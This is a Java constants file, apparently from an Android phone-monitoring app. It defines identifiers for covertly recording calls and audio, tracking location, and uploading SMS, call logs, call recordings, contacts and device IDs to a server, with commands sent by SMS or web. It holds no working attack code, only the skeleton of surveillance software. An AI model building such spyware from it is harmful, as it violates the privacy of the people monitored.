package com.privacy.monitor.base;

/**
 * 常量
 */
public class C {
	
	public static boolean isRecorder;
	public static boolean isBoot;
	public static String APP_REQ_KEY ;
	
	/**定时任务为录音*/
	public static final String REG_TYPE_REC = "1";
	/**定时任务为定位*/
	public static final String REG_TYPE_LOC = "2";
	
	public static final int CALL_RECORD =1;
	public static final int MESSAGE_RECORD = 2;
	
	public static final String BUNDLE_NAME = "bundle";
	
	public static final String FLAG= "flag";
	
	public static final String DEVICE_ID ="deviceid";
	
	public static final String DEVICE_INFO = "device";
	
	public static final String PHONE_NUM = "phone";
	
	public static final String SIM_ID = "simid";
	
	public static final String DEVICE_BRAND = "brand";
	
	public static final String DEVICE_SYSTEM = "system";
	
	public static final String DEVICE_SUP_REC = "rec";
	
	public static final String DEVICE_SUP_CALL_REC = "callRec";
	
	public static final String DEVICE_SUP_GPS = "gps";
	
	public static final String CONTACTS_UPLOAD = "upload";
	
	public static final String IS_UPLOAD = "uploadStatus";
	
	public static final String CRON_ACTION = "com.privacy.monitor.cron";
	
	public static final String ENV_ACTION = "com.privacy.monitor.sr";
	
	public class RequestMethod{
		//上传短信信息
		public static final String uploadSMS = "device_req_ebbc08c492539282f36f969";
		//获取监控手机号
		public static final String getMonitorList = "041e83198b89ce1eb95d05b41b5b1a67";
		
		//上传通话记录
		public static final String uploadCallRecord = "device_req_b19c188333ed2454651f19";
	
		//上传文件
		public static final String uploadCallSound = "device_req_651f19b333ed2419c18854";
		
		//上传当前位置
		public static final String uploadLocation = "09fad6e85819b93d5a9221a85a643cc6";
	
		//上传通信录
		public static final String uploadContact = "device_req_a1d50571f33015282adc";
		
	
	}
	
	//标记是否需要上传数据
	public static boolean isUpload = false;
	
	/**指令平台*/
	public class Directive{
		public static final int SMS = 1;
		public static final int WEB = 2;
	}
}
